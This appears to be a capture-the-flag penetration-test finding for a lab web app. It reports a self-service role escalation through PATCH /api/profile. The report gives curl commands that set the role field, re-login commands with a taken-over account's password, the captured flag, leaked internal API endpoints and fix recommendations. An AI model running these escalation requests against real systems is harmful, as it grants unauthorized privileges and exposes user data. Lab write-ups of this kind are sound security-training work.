# Finding 03 — Self-service role escalation via PATCH /api/profile → FLAG 2

**Target:** http://192.168.1.74:4942
**Severity:** High
**Status:** Confirmed exploitable
**Flag:** `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

## Summary

`PATCH /api/profile` accepts a `role` field directly from the client. The
server does reject `staff`/`admin` ("role not assignable"), but **not**
`cadet`, which should also be a privileged tier. This real, persisted
role change (not just a forged JWT) unlocks the "Staff area" nav item,
the privilege ladder's "Staff campus" tier, and `/staff/dashboard`.

`/api/docs-internal` (also reachable once past this gate) openly documents
the writable fields and valid role values:
```json
{"writable_fields":["first_name","last_name","campus","avatar","role"],
 "role_values":["visitor","student","cadet","staff","god"],
 "note":"role writable via PATCH /api/profile"}
```

## Steps to reproduce

1. Log in as any student (e.g. via Finding 01's takeover of `jdoe`).
2. Escalate your own role:

   ```
   curl -s -X PATCH http://192.168.1.74:4942/api/profile \
     -b cookies_jdoe.txt -H 'Content-Type: application/json' \
     -d '{"role":"cadet"}'
   ```

   → `200 OK`, response shows `"role":"cadet"`.

3. Re-login (session JWT caches the old role) and visit `/staff/dashboard`:

   ```
   curl -s -X POST http://192.168.1.74:4942/login \
     --data-urlencode 'identity=jdoe@student.42.tech' \
     --data-urlencode 'password=Pwned1234!' -c cookies_jdoe.txt
   curl -s -b cookies_jdoe.txt http://192.168.1.74:4942/staff/dashboard
   ```

4. Dashboard banner reveals:
   ```
   🔓 Cadet+ access granted — internal staff flag: FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
   ```

## Side findings surfaced from the dashboard

- `GET /api/users` — full user directory (id/username/email/role/level/campus) with **no auth-level check beyond "logged in"** (cadet session sufficed).
- `GET /api/docs-internal` — leaks the internal API schema (writable fields, valid roles, grades query parameter).
- `GET /api/grades?student={id}` — documented as a filter, but confirmed to only return records that exist (not itself an IDOR; staff/god accounts simply have no grade rows).
- Full access ladder is: Visitor → Student → **Staff campus** (= cadet, reached here) → Staff 42Network → Staff 42. The latter two tiers are still locked — likely require `role: staff` or `role: god`, which are blocked from self-assignment.

## Fix recommendation

- Server-side allow-list should block **all** elevated roles from self-service
  PATCH, not just `staff`/`admin`. Role changes should go through a separate
  privileged workflow.
- `/api/users` and `/api/docs-internal` should require the actual target
  privilege level (staff/god), not just "any authenticated user."
